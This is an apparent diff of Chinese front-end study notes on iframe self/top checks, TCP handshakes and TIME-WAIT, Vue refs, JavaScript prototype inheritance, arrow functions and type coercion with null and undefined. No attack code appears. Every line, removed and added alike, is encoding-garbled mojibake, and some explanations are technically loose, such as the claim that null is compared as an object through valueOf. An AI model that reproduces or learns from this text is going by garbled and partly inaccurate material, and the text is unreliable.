+selfè¡¨ç¤ºå½“å‰çª—å£,topè¡¨ç¤ºé¡¶çº§çª—å£ <body><iframe ...><body> iframeé‡Œé¢å¼•å…¥ä¸€ä¸ªç½‘ç«™é‚£ä¹ˆå‡å¦‚è¯¥ç½‘ç«™æœ‰åˆ¤å®šself==topæ‰åŠ è½½çš„æ—¶å€™,å¦‚æžœä¸ç›¸ç­‰å°±ä¼šè¢«æ‹¦æˆª.selfå°±æ˜¯iframè‡ªå·±
 
-×¢Òâ:ÇëÇó²»ÐèÒªÁ¬½Ó²Å¿ÉÒÔ·¢,µ«ÊÇÊý¾Ý±ØÐëÒªÁ¬½Ó³É¹¦²Å¿ÉÒÔ·¢!
+æ³¨æ„:è¯·æ±‚ä¸éœ€è¦è¿žæŽ¥æ‰å¯ä»¥å‘,ä½†æ˜¯æ•°æ®å¿…é¡»è¦è¿žæŽ¥æˆåŠŸæ‰å¯ä»¥å‘!
 
-ÎªÊ²Ã´ TCP ½¨Á¢Á¬½ÓÐèÒªÈý´ÎÎÕÊÖ£¬Ã÷Ã÷Á½´Î¾Í¿ÉÒÔ½¨Á¢ÆðÁ¬½Ó?
-´ð: c ¿Í»§¶Ë s ·þÎñ¶Ë  µÚÒ»´ÎÎÕÊÖs¿ÉÒÔÖªµÀ×Ô¼ºÄÜ½ÓÊÕ(cÄÜ·¢ËÍ) ,µÚ¶þ´ÎÎÕÊÖc¾ÍÖªµÀ×Ô¼º½ÓÊÜ·¢ËÍ¶¼ÊÇ¶ÔµÄ(sÄÜ·¢ËÍ),µ«ÊÇs´ËÊ±²»ÖªµÀ×Ô¼º·¢ËÍÊÇ·ñ³É¹¦,ÕâÊ±ºòÈç¹ûcÔÙ·¢ËÍÒ»´Î,sÊÕµ½ÄÇÃ´¾ÍÖªµÀ×Ô¼º½ÓÊÕ·¢ËÍ¶¼ÊÇ³É¹¦µÄ¾Í¿ÉÒÔ½¨Á¢Á¬½ÓÁË!
+ä¸ºä»€ä¹ˆ TCP å»ºç«‹è¿žæŽ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ˜Žæ˜Žä¸¤æ¬¡å°±å¯ä»¥å»ºç«‹èµ·è¿žæŽ¥?
+ç­”: c å®¢æˆ·ç«¯ s æœåŠ¡ç«¯  ç¬¬ä¸€æ¬¡æ¡æ‰‹så¯ä»¥çŸ¥é“è‡ªå·±èƒ½æŽ¥æ”¶(cèƒ½å‘é€) ,ç¬¬äºŒæ¬¡æ¡æ‰‹cå°±çŸ¥é“è‡ªå·±æŽ¥å—å‘é€éƒ½æ˜¯å¯¹çš„(sèƒ½å‘é€),ä½†æ˜¯sæ­¤æ—¶ä¸çŸ¥é“è‡ªå·±å‘é€æ˜¯å¦æˆåŠŸ,è¿™æ—¶å€™å¦‚æžœcå†å‘é€ä¸€æ¬¡,sæ”¶åˆ°é‚£ä¹ˆå°±çŸ¥é“è‡ªå·±æŽ¥æ”¶å‘é€éƒ½æ˜¯æˆåŠŸçš„å°±å¯ä»¥å»ºç«‹è¿žæŽ¥äº†!
 
 
 
-¶øÈç¹ûÊÇÁ½´ÎÁ¬½Ó,¼ÙÉè´æÔÚÏÂÃæÒ»¸öÇé¿ö,»á³öÏÖÊ²Ã´Çé¿ö?
-Æð³õ£¬Á½¶Ë¶¼Îª CLOSED ×´Ì¬¡£ÔÚÍ¨ÐÅ¿ªÊ¼Ç°£¬Ë«·½¶¼»á´´½¨ TCB¡£ ·þÎñÆ÷´´½¨Íê TCB ºó±ã½øÈë LISTEN ×´Ì¬£¬´ËÊ±¿ªÊ¼µÈ´ý¿Í»§¶Ë·¢ËÍÊý¾Ý.¿Í»§¶Ë·¢ËÍÁËÒ»¸öÇëÇóA,µ«ÊÇÒòÎªÍøÂçÑÓ³ÙµÄÔ­ÒòÔÝÊ±Ã»µ½´ï·þÎñ¶Ë,TCP´ËÊ±¾Í»áÆô¶¯³¬Ê±ÖØ´«·¢ËÍÒ»¸öÇëÇóB,B³É¹¦·¢ËÍ,·þÎñ¶Ë½ÓÊÕÇëÇó¸æËß¿Í»§¶ËÒÑÊÕµ½²¢Ö±½Ó½«×´Ì¬±äÎªestablished,¿Í»§¶ËÊÕµ½·þÎñÆ÷·¢µÄÓ¦´ðÒ²½«×´Ì¬±äÎªestablished,´ËÊ±Á¬½Ó³É¹¦.È»ºó¹ýÁËÒ»»áÖ®ºó,Á½¸ö¶¼¹Ø±ÕÁ¬½Ó.µ«ÊÇÕâÊ±ºòÇëÇóAµ½´ïÁË·þÎñ¶Ë,·þÎñ¶Ë½ÓÊÕ³É¹¦²¢·µ»ØÒ»¸öÏìÓ¦¸ø¿Í»§¶ËÍ¬Ê±½«×´Ì¬±äÎªestablished,µ«ÊÇ´ËÊ±¿Í»§¶Ë´¦ÓÚclose×´Ì¬,¸ù±¾ÊÕ²»µ½Õâ¸öÓ¦´ð,»áÔì³É·þÎñ¶ËÒ»Ö±µÈ´ý,´Ó¶ø×ÊÔ´ÀË·Ñ!
+è€Œå¦‚æžœæ˜¯ä¸¤æ¬¡è¿žæŽ¥,å‡è®¾å­˜åœ¨ä¸‹é¢ä¸€ä¸ªæƒ…å†µ,ä¼šå‡ºçŽ°ä»€ä¹ˆæƒ…å†µ?
+èµ·åˆï¼Œä¸¤ç«¯éƒ½ä¸º CLOSED çŠ¶æ€ã€‚åœ¨é€šä¿¡å¼€å§‹å‰ï¼ŒåŒæ–¹éƒ½ä¼šåˆ›å»º TCBã€‚ æœåŠ¡å™¨åˆ›å»ºå®Œ TCB åŽä¾¿è¿›å…¥ LISTEN çŠ¶æ€ï¼Œæ­¤æ—¶å¼€å§‹ç­‰å¾…å®¢æˆ·ç«¯å‘é€æ•°æ®.å®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªè¯·æ±‚A,ä½†æ˜¯å› ä¸ºç½‘ç»œå»¶è¿Ÿçš„åŽŸå› æš‚æ—¶æ²¡åˆ°è¾¾æœåŠ¡ç«¯,TCPæ­¤æ—¶å°±ä¼šå¯åŠ¨è¶…æ—¶é‡ä¼ å‘é€ä¸€ä¸ªè¯·æ±‚B,BæˆåŠŸå‘é€,æœåŠ¡ç«¯æŽ¥æ”¶è¯·æ±‚å‘Šè¯‰å®¢æˆ·ç«¯å·²æ”¶åˆ°å¹¶ç›´æŽ¥å°†çŠ¶æ€å˜ä¸ºestablished,å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘çš„åº”ç­”ä¹Ÿå°†çŠ¶æ€å˜ä¸ºestablished,æ­¤æ—¶è¿žæŽ¥æˆåŠŸ.ç„¶åŽè¿‡äº†ä¸€ä¼šä¹‹åŽ,ä¸¤ä¸ªéƒ½å…³é—­è¿žæŽ¥.ä½†æ˜¯è¿™æ—¶å€™è¯·æ±‚Aåˆ°è¾¾äº†æœåŠ¡ç«¯,æœåŠ¡ç«¯æŽ¥æ”¶æˆåŠŸå¹¶è¿”å›žä¸€ä¸ªå“åº”ç»™å®¢æˆ·ç«¯åŒæ—¶å°†çŠ¶æ€å˜ä¸ºestablished,ä½†æ˜¯æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºŽcloseçŠ¶æ€,æ ¹æœ¬æ”¶ä¸åˆ°è¿™ä¸ªåº”ç­”,ä¼šé€ æˆæœåŠ¡ç«¯ä¸€ç›´ç­‰å¾…,ä»Žè€Œèµ„æºæµªè´¹!
 
-TCP¶Ï¿ªËÄ´ÎÁ¬½Ó
-1.¿Í»§¶ËÈÏÎªÊý¾ÝÒÑ¾­·¢ËÍÍê³É,Ïò·þÎñ¶Ë·¢ËÍ¶Ï¿ªÇëÇó!
-2.·þÎñ¶ËÏò¿Í»§¶Ë·¢ËÍÇëÇó²¢±íÊ¾×Ô¼ºÕâ±ß¿ÉÄÜ»¹ÓÐÊý¾ÝÒª´«!²¢ÊÍ·ÅÁË¿Í»§¶Ëµ½·þÎñ¶ËµÄÁ¬½Ó,Ò²¾ÍÊÇ·þÎñ¶Ë²»ÔÙ½ÓÊÜ¿Í»§¶ËµÄÊý¾Ý!(ÇëÇóÊÇÇëÇó,Êý¾ÝÊÇÊý¾Ý,Èý´ÎÎÕÊÖ³É¹¦,²ÅÄÜ½¨Á¢Á¬½Ó,Á¬½Ó³É¹¦,²ÅÄÜ·¢ËÍÊý¾Ý!)
-3.·þÎñ¶ËÔÙ´ÎÏò¿Í»§¶Ë·¢ËÍÇëÇó±íÊ¾×Ô¼ºÊý¾ÝÒÑ¾­·¢ËÍÍê±Ï,¿Í»§¶Ë¿ÉÒÔ¶Ï¿ªÁ¬½ÓÁË!
-4.¿Í»§¶ËÊÕµ½·þÎñ¶Ë¶Ï¿ªÇëÇó,²¢ÔÙ´ÎÏò·þÎñ¶Ë·¢ËÍÈ·ÈÏ¶Ï¿ª,×Ô¼ºÍ¬Ê±½øÈëTime-wait×´Ì¬,ÔÚ2MSLÄÚÈç¹ûÃ»ÓÐÊÕµ½·þÎñ¶ËµÄÔÙ´ÎÇëÇó,¿Í»§¶ËÊÍ·ÅÁ¬½Ó½øÈëclose×´Ì¬!·þÎñ¶ËÊÕµ½ÇëÇó,Ò²½øÈë¹Ø±Õ×´Ì¬!
+TCPæ–­å¼€å››æ¬¡è¿žæŽ¥
+1.å®¢æˆ·ç«¯è®¤ä¸ºæ•°æ®å·²ç»å‘é€å®Œæˆ,å‘æœåŠ¡ç«¯å‘é€æ–­å¼€è¯·æ±‚!
+2.æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚å¹¶è¡¨ç¤ºè‡ªå·±è¿™è¾¹å¯èƒ½è¿˜æœ‰æ•°æ®è¦ä¼ !å¹¶é‡Šæ”¾äº†å®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¿žæŽ¥,ä¹Ÿå°±æ˜¯æœåŠ¡ç«¯ä¸å†æŽ¥å—å®¢æˆ·ç«¯çš„æ•°æ®!(è¯·æ±‚æ˜¯è¯·æ±‚,æ•°æ®æ˜¯æ•°æ®,ä¸‰æ¬¡æ¡æ‰‹æˆåŠŸ,æ‰èƒ½å»ºç«‹è¿žæŽ¥,è¿žæŽ¥æˆåŠŸ,æ‰èƒ½å‘é€æ•°æ®!)
+3.æœåŠ¡ç«¯å†æ¬¡å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚è¡¨ç¤ºè‡ªå·±æ•°æ®å·²ç»å‘é€å®Œæ¯•,å®¢æˆ·ç«¯å¯ä»¥æ–­å¼€è¿žæŽ¥äº†!
+4.å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯æ–­å¼€è¯·æ±‚,å¹¶å†æ¬¡å‘æœåŠ¡ç«¯å‘é€ç¡®è®¤æ–­å¼€,è‡ªå·±åŒæ—¶è¿›å…¥Time-waitçŠ¶æ€,åœ¨2MSLå†…å¦‚æžœæ²¡æœ‰æ”¶åˆ°æœåŠ¡ç«¯çš„å†æ¬¡è¯·æ±‚,å®¢æˆ·ç«¯é‡Šæ”¾è¿žæŽ¥è¿›å…¥closeçŠ¶æ€!æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚,ä¹Ÿè¿›å…¥å…³é—­çŠ¶æ€!
 
-ÎªÊ²Ã´¿Í»§¶ËÒª½øÈëTIME-WAIT×´Ì¬£¬µÈ´ý2MSLÊ±¼äºó²Å½øÈëCLOSED×´Ì¬£¿
+ä¸ºä»€ä¹ˆå®¢æˆ·ç«¯è¦è¿›å…¥TIME-WAITçŠ¶æ€ï¼Œç­‰å¾…2MSLæ—¶é—´åŽæ‰è¿›å…¥CLOSEDçŠ¶æ€ï¼Ÿ
 
-ÕâÊÇÎªÁË±£Ö¤·þÎñ¶ËÄÜÊÕµ½¿Í»§¶ËµÄÈ·ÈÏÓ¦´ð¡£Èô¿Í»§¶Ë·¢ÍêÈ·ÈÏÓ¦´ðºóÖ±½Ó½øÈëCLOSED×´Ì¬£¬Èç¹ûÈ·ÈÏÓ¦´ðÒòÎªÍøÂçÎÊÌâÒ»Ö±Ã»ÓÐµ½´ï£¬ÄÇÃ´¾Í»áÔì³É·þÎñ¶Ë²»ÄÜÕý³£¹Ø±Õ(·þÎñ¶ËÖ»ÓÐÊÕµ½ÁËÓ¦´ð²Å»áclosed)¼ÙÉèÔÚ2mslÀïÃæ·þÎñ¶ËÃ»ÓÐÊÕµ½¿Í»§¶Ë±¨ÎÄ,¾Í»áÖØ·¢Ö®Ç°µÄÇëÇó,ÕâÊ±ºò¿Í»§¶Ë±ã»á»Øµ½Ö®Ç°µÄµÚËÄ´ÎÎÕÊÖ,Ö±µ½2mslÃ»ÓÐÊÕµ½ÇëÇó²Å½øÈëclosed×´Ì¬!
+è¿™æ˜¯ä¸ºäº†ä¿è¯æœåŠ¡ç«¯èƒ½æ”¶åˆ°å®¢æˆ·ç«¯çš„ç¡®è®¤åº”ç­”ã€‚è‹¥å®¢æˆ·ç«¯å‘å®Œç¡®è®¤åº”ç­”åŽç›´æŽ¥è¿›å…¥CLOSEDçŠ¶æ€ï¼Œå¦‚æžœç¡®è®¤åº”ç­”å› ä¸ºç½‘ç»œé—®é¢˜ä¸€ç›´æ²¡æœ‰åˆ°è¾¾ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆæœåŠ¡ç«¯ä¸èƒ½æ­£å¸¸å…³é—­(æœåŠ¡ç«¯åªæœ‰æ”¶åˆ°äº†åº”ç­”æ‰ä¼šclosed)å‡è®¾åœ¨2mslé‡Œé¢æœåŠ¡ç«¯æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯æŠ¥æ–‡,å°±ä¼šé‡å‘ä¹‹å‰çš„è¯·æ±‚,è¿™æ—¶å€™å®¢æˆ·ç«¯ä¾¿ä¼šå›žåˆ°ä¹‹å‰çš„ç¬¬å››æ¬¡æ¡æ‰‹,ç›´åˆ°2mslæ²¡æœ‰æ”¶åˆ°è¯·æ±‚æ‰è¿›å…¥closedçŠ¶æ€!
 
-refÐèÒªÔÚdomäÖÈ¾Íê³Éºó²Å»áÓÐ,ËùÒÔthis.$refs.resetFields()Òª·ÅÔÚthis.$nextTick()ÖÐÊ¹ÓÃ,»òÕßÔÚmounted()¹³×ÓÖÐÊ¹ÓÃref,v-forÀïÃæµÄrefµÃµ½µÄÊÇÒ»¸öÊý×é
+reféœ€è¦åœ¨domæ¸²æŸ“å®ŒæˆåŽæ‰ä¼šæœ‰,æ‰€ä»¥this.$refs.resetFields()è¦æ”¾åœ¨this.$nextTick()ä¸­ä½¿ç”¨,æˆ–è€…åœ¨mounted()é’©å­ä¸­ä½¿ç”¨ref,v-foré‡Œé¢çš„refå¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ•°ç»„
 
-javascriptÖÐµÄÃ¿Ò»¸öº¯Êý¶¼ÓÐÒ»¸öÖ¸ÏòÄ³Ò»¸ö¶ÔÏóµÄprototypeÊôÐÔ£¬¸Ãº¯Êýµ±±»º¯Êýnew²Ù×÷·ûµ÷ÓÃÊ±»á´´½¨²¢·µ»ØÒ»¸ö¶ÔÏó£¬²¢ÇÒ¸Ã¶ÔÏóÖÐ»áÓÐÒ»¸öÖ¸ÏòÆäÔ­ÐÍ¶ÔÏóµÄÃØÃÜÁ´½Ó£¬Í¨¹ý¸ÃÁ´½Ó£¨ÓÐÐ©»·¾³ÏÂ±»³ÆÖ®Îª__proto__£©£¬¿ÉÒÔÔÚÐÂ½¨¶ÔÏóÉÏµ÷ÓÃÏà¹ØÔ­ÐÍ¶ÔÏóµÄ·½·¨ºÍÊôÐÔ
-¶øÔ­ÐÍ¶ÔÏó×ÔÉíÒ²¾ßÓÐ¶ÔÏó¹ÌÓÐµÄÆÕ±éÌØÕ÷£¬Òò´Ë±¾ÉíÒ²°üº¬ÁËÖ¸ÏòÆäÔ­ÐÍµÄÁ´½Ó¡£ÓÉ´Ë¾ÍÐÎ³ÉÁËÒ»ÌõÁ´£¬ÎÒÃÇ³ÆÖ®ÎªÔ­ÐÍÁ´¡£
+javascriptä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘æŸä¸€ä¸ªå¯¹è±¡çš„prototypeå±žæ€§ï¼Œè¯¥å‡½æ•°å½“è¢«å‡½æ•°newæ“ä½œç¬¦è°ƒç”¨æ—¶ä¼šåˆ›å»ºå¹¶è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡ä¸­ä¼šæœ‰ä¸€ä¸ªæŒ‡å‘å…¶åŽŸåž‹å¯¹è±¡çš„ç§˜å¯†é“¾æŽ¥ï¼Œé€šè¿‡è¯¥é“¾æŽ¥ï¼ˆæœ‰äº›çŽ¯å¢ƒä¸‹è¢«ç§°ä¹‹ä¸º__proto__ï¼‰ï¼Œå¯ä»¥åœ¨æ–°å»ºå¯¹è±¡ä¸Šè°ƒç”¨ç›¸å…³åŽŸåž‹å¯¹è±¡çš„æ–¹æ³•å’Œå±žæ€§
+è€ŒåŽŸåž‹å¯¹è±¡è‡ªèº«ä¹Ÿå…·æœ‰å¯¹è±¡å›ºæœ‰çš„æ™®éç‰¹å¾ï¼Œå› æ­¤æœ¬èº«ä¹ŸåŒ…å«äº†æŒ‡å‘å…¶åŽŸåž‹çš„é“¾æŽ¥ã€‚ç”±æ­¤å°±å½¢æˆäº†ä¸€æ¡é“¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºåŽŸåž‹é“¾ã€‚
 
-ÔÚ¹¹Ôìº¯ÊýÀïÃæµ÷ÓÃParent.call(this,Öµ)¿ÉÒÔÖ±½Ó¼Ì³Ð¸¸Ç×µÄÊôÐÔ,¼Ì³Ð¸¸ÀàµÄ·½·¨ÔòÊÇ½«Ô­ÐÍ¶ÔÏó¸ÄÎªÒ»¸ö¸¸ÀàµÄÊµÀý¶ÔÏó
+åœ¨æž„é€ å‡½æ•°é‡Œé¢è°ƒç”¨Parent.call(this,å€¼)å¯ä»¥ç›´æŽ¥ç»§æ‰¿çˆ¶äº²çš„å±žæ€§,ç»§æ‰¿çˆ¶ç±»çš„æ–¹æ³•åˆ™æ˜¯å°†åŽŸåž‹å¯¹è±¡æ”¹ä¸ºä¸€ä¸ªçˆ¶ç±»çš„å®žä¾‹å¯¹è±¡
 
-ÎªÊ²Ã´ÊÇChild.prototype = new Parent()¶ø²»ÊÇÎªParent.prototype,ÒòÎªÈç¹ûÊÇºóÕßµ±ÄãÏëÌí¼Ó×Ô¼ºµÄChild.prototype.func·½·¨Ê±»á¼Óµ½Parent.prototypeÉÏÃæÈ¥,Èç¹û¸¸Àà¸ÕºÃÒ²ÓÐÕâ¸ö·½·¨,ÉõÖÁ»á½«Æä¸²¸Ç,µ±¸¸Ààµ÷ÓÃÄÄ¸ö·½·¨Ê±,·½·¨ÒÑ¾­±äÁË,»á³öÎÊÌâ.µ«ÊÇÕâÑùÒ²»áÓÐÒ»¸öÎÊÌâ¾ÍÊÇÒòÎªÊÇnew ParentµÄËùÒÔ_proto_ÏÂÃæ»á¶à³öÁË²»ÐèÒªµÄ¸¸Ç×µÄÊôÐÔ,Ôì³ÉÄÚ´æÀË·Ñ
+ä¸ºä»€ä¹ˆæ˜¯Child.prototype = new Parent()è€Œä¸æ˜¯ä¸ºParent.prototype,å› ä¸ºå¦‚æžœæ˜¯åŽè€…å½“ä½ æƒ³æ·»åŠ è‡ªå·±çš„Child.prototype.funcæ–¹æ³•æ—¶ä¼šåŠ åˆ°Parent.prototypeä¸Šé¢åŽ»,å¦‚æžœçˆ¶ç±»åˆšå¥½ä¹Ÿæœ‰è¿™ä¸ªæ–¹æ³•,ç”šè‡³ä¼šå°†å…¶è¦†ç›–,å½“çˆ¶ç±»è°ƒç”¨å“ªä¸ªæ–¹æ³•æ—¶,æ–¹æ³•å·²ç»å˜äº†,ä¼šå‡ºé—®é¢˜.ä½†æ˜¯è¿™æ ·ä¹Ÿä¼šæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å› ä¸ºæ˜¯new Parentçš„æ‰€ä»¥_proto_ä¸‹é¢ä¼šå¤šå‡ºäº†ä¸éœ€è¦çš„çˆ¶äº²çš„å±žæ€§,é€ æˆå†…å­˜æµªè´¹
 
-¼ýÍ·º¯ÊýÌåÈç¹ûÓÐ¶à¸ö±í´ïÊ½¾ÍÐèÒªÓÃ{}°ü¹üÆðÀ´,²¢ÇÒÐèÒªÐ´return;Èç¹û·µ»ØÒ»¸ö¶ÔÏó¾ÍÐèÒª()°üÆðÀ´,»¹ÓÐÒ»ÖÖÐ´·¨ÊÇ¿ÉÒÔÓÃÀ¨ºÅÀ¨ÆðÀ´,È»ºóÔÙÓÃ¶ººÅ½«±í´ïÊ½¸ô¿ª,×îºóÒ»¸ö±í´ïÊ½¾ÍÊÇ·µ»ØµÄ½á¹û,ÀýÈçlet f = (x,y) => (x++,y++,x*y) ,f(1,2) = 6
+ç®­å¤´å‡½æ•°ä½“å¦‚æžœæœ‰å¤šä¸ªè¡¨è¾¾å¼å°±éœ€è¦ç”¨{}åŒ…è£¹èµ·æ¥,å¹¶ä¸”éœ€è¦å†™return;å¦‚æžœè¿”å›žä¸€ä¸ªå¯¹è±¡å°±éœ€è¦()åŒ…èµ·æ¥,è¿˜æœ‰ä¸€ç§å†™æ³•æ˜¯å¯ä»¥ç”¨æ‹¬å·æ‹¬èµ·æ¥,ç„¶åŽå†ç”¨é€—å·å°†è¡¨è¾¾å¼éš”å¼€,æœ€åŽä¸€ä¸ªè¡¨è¾¾å¼å°±æ˜¯è¿”å›žçš„ç»“æžœ,ä¾‹å¦‚let f = (x,y) => (x++,y++,x*y) ,f(1,2) = 6
 
-Èç¹ûÊÇ ToPrimitive(obj, Number)£¬´¦Àí²½ÖèÈçÏÂ£º
+å¦‚æžœæ˜¯ ToPrimitive(obj, Number)ï¼Œå¤„ç†æ­¥éª¤å¦‚ä¸‹ï¼š
 
-Èç¹û obj Îª »ù±¾ÀàÐÍ£¬Ö±½Ó·µ»Ø
-·ñÔò£¬µ÷ÓÃ valueOf ·½·¨£¬Èç¹û·µ»ØÒ»¸öÔ­Ê¼Öµ£¬Ôò JavaScript ½«Æä·µ»Ø¡£
-·ñÔò£¬µ÷ÓÃ toString ·½·¨£¬Èç¹û·µ»ØÒ»¸öÔ­Ê¼Öµ£¬Ôò JavaScript ½«Æä·µ»Ø¡£
-·ñÔò£¬JavaScript Å×³öÒ»¸öÀàÐÍ´íÎóÒì³£¡£
+å¦‚æžœ obj ä¸º åŸºæœ¬ç±»åž‹ï¼Œç›´æŽ¥è¿”å›ž
+å¦åˆ™ï¼Œè°ƒç”¨ valueOf æ–¹æ³•ï¼Œå¦‚æžœè¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œåˆ™ JavaScript å°†å…¶è¿”å›žã€‚
+å¦åˆ™ï¼Œè°ƒç”¨ toString æ–¹æ³•ï¼Œå¦‚æžœè¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œåˆ™ JavaScript å°†å…¶è¿”å›žã€‚
+å¦åˆ™ï¼ŒJavaScript æŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯å¼‚å¸¸ã€‚
 
-Èç¹ûÊÇ ToPrimitive(obj, String)£¬´¦Àí²½ÖèÈçÏÂ£º
+å¦‚æžœæ˜¯ ToPrimitive(obj, String)ï¼Œå¤„ç†æ­¥éª¤å¦‚ä¸‹ï¼š
 
-Èç¹û objÎª »ù±¾ÀàÐÍ£¬Ö±½Ó·µ»Ø
-·ñÔò£¬µ÷ÓÃ toString ·½·¨£¬Èç¹û·µ»ØÒ»¸öÔ­Ê¼Öµ£¬Ôò JavaScript ½«Æä·µ»Ø¡£
-·ñÔò£¬µ÷ÓÃ valueOf ·½·¨£¬Èç¹û·µ»ØÒ»¸öÔ­Ê¼Öµ£¬Ôò JavaScript ½«Æä·µ»Ø¡£
-·ñÔò£¬JavaScript Å×³öÒ»¸öÀàÐÍ´íÎóÒì³£¡£
+å¦‚æžœ objä¸º åŸºæœ¬ç±»åž‹ï¼Œç›´æŽ¥è¿”å›ž
+å¦åˆ™ï¼Œè°ƒç”¨ toString æ–¹æ³•ï¼Œå¦‚æžœè¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œåˆ™ JavaScript å°†å…¶è¿”å›žã€‚
+å¦åˆ™ï¼Œè°ƒç”¨ valueOf æ–¹æ³•ï¼Œå¦‚æžœè¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œåˆ™ JavaScript å°†å…¶è¿”å›žã€‚
+å¦åˆ™ï¼ŒJavaScript æŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯å¼‚å¸¸ã€‚
 
-ÓÉÓÚundefined×ª»»³ÉÊý×ÖÎªNaN£¬ËùÒÔ½«Number,String,BooleanÕâÈýÖÖÀàÐÍÓëundefined±È½ÏÊ±£¬×ÜÊÇ·µ»Øfalse ¶ø¶ÔÓÚnull£¬JSÔò½«Æäµ±³É¶ÔÏóÀ´±È½Ï£¬¼´³¢ÊÔµ÷ÓÃnullµÄvalueOfÓëtoString·½·¨£¬ÔÙ½«·µ»ØµÄ½á¹ûÓëÁíÒ»¸öÖµ½øÐÐ±È½Ï,¿ÉÒÔÍÆ¶Ïnull==false·µ»ØfalseµÄÔ­ÒòÊÇÒòÎªnullµÄvalueOfÊµÏÖµ¼ÖÂµÄ,ÓÉÓÚnullÃ»ÓÐvalueOfÓëtoString·½·¨£¬Òò´ËÊ¼ÖÕ·µ»Øfalse. µ«ÊÇÒª×¢ÒâµÄÊÇnull == undefinedÎªtrue
+ç”±äºŽundefinedè½¬æ¢æˆæ•°å­—ä¸ºNaNï¼Œæ‰€ä»¥å°†Number,String,Booleanè¿™ä¸‰ç§ç±»åž‹ä¸Žundefinedæ¯”è¾ƒæ—¶ï¼Œæ€»æ˜¯è¿”å›žfalse è€Œå¯¹äºŽnullï¼ŒJSåˆ™å°†å…¶å½“æˆå¯¹è±¡æ¥æ¯”è¾ƒï¼Œå³å°è¯•è°ƒç”¨nullçš„valueOfä¸ŽtoStringæ–¹æ³•ï¼Œå†å°†è¿”å›žçš„ç»“æžœä¸Žå¦ä¸€ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒ,å¯ä»¥æŽ¨æ–­null==falseè¿”å›žfalseçš„åŽŸå› æ˜¯å› ä¸ºnullçš„valueOfå®žçŽ°å¯¼è‡´çš„,ç”±äºŽnullæ²¡æœ‰valueOfä¸ŽtoStringæ–¹æ³•ï¼Œå› æ­¤å§‹ç»ˆè¿”å›žfalse. ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯null == undefinedä¸ºtrue
 
-ËùÒÔ×Ü½áÖªµÀ
-undefined±»µ±³É»ù±¾ÀàÐÍ£¬undefined×ª»»³ÉÊý×ÖÊÇNaN£¬Òò´ËundefinedÓë³ýnullÖ®ÍâµÄÆäËüÀàÐÍÖµ½øÐÐ±È½ÏÊ±Ê¼ÖÕ·µ»Øfalse(×¢ÒâNaN==NaN·µ»Øfalse) 
-null±»µ±³É¸´ºÏ¶ÔÏó£¬ÓÉÓÚnullÃ»ÓÐvalueOfÓëtoString·½·¨£¬Òò´ËºÍ³ýÁËundefinedÖ®ÍâµÄÆäËüÀàÐÍÖµ½øÐÐ±È½ÏÊ±Ê¼ÖÕ·µ»Øfalse 
+æ‰€ä»¥æ€»ç»“çŸ¥é“
+undefinedè¢«å½“æˆåŸºæœ¬ç±»åž‹ï¼Œundefinedè½¬æ¢æˆæ•°å­—æ˜¯NaNï¼Œå› æ­¤undefinedä¸Žé™¤nullä¹‹å¤–çš„å…¶å®ƒç±»åž‹å€¼è¿›è¡Œæ¯”è¾ƒæ—¶å§‹ç»ˆè¿”å›žfalse(æ³¨æ„NaN==NaNè¿”å›žfalse) 
+nullè¢«å½“æˆå¤åˆå¯¹è±¡ï¼Œç”±äºŽnullæ²¡æœ‰valueOfä¸ŽtoStringæ–¹æ³•ï¼Œå› æ­¤å’Œé™¤äº†undefinedä¹‹å¤–çš„å…¶å®ƒç±»åž‹å€¼è¿›è¡Œæ¯”è¾ƒæ—¶å§‹ç»ˆè¿”å›žfalse 
 
-'a'++'b'ÊÇ'aNaN' ÕâÀï+'b'¾Í±íÊ¾Number('b')ËùÒÔÄã¶®µÄ¾ÍÊÇNaN 'a'+NaN¾ÍÊÇ'aNaN'
+'a'++'b'æ˜¯'aNaN' è¿™é‡Œ+'b'å°±è¡¨ç¤ºNumber('b')æ‰€ä»¥ä½ æ‡‚çš„å°±æ˜¯NaN 'a'+NaNå°±æ˜¯'aNaN'
 
-==ÅÐ¶ÏÍ¬ÖÖÀàÐÍ²»Ðè×ª»»,²»Í¬ÀàÐÍÐèÒª×ªÎª×Ö·û´®»òÕßÊýÖµÀ´½øÐÐ±È½Ï[] == '0'¾ÍÊÇfalse »á±äÎª
-'' == '0' ¶ø [] == 0 Îªtrue »á±äÎª 0 == 0
+==åˆ¤æ–­åŒç§ç±»åž‹ä¸éœ€è½¬æ¢,ä¸åŒç±»åž‹éœ€è¦è½¬ä¸ºå­—ç¬¦ä¸²æˆ–è€…æ•°å€¼æ¥è¿›è¡Œæ¯”è¾ƒ[] == '0'å°±æ˜¯false ä¼šå˜ä¸º
+'' == '0' è€Œ [] == 0 ä¸ºtrue ä¼šå˜ä¸º 0 == 0
 
-ÄÇÎªÊ²Ã´null == undefined Õâ¸öÊÇ¹æ¶¨,Ã»ÓÐÎªÊ²Ã´... Number(null)Îª0 Number(undefined)ÎªNaN, NaN == NaN ÊÇfalse
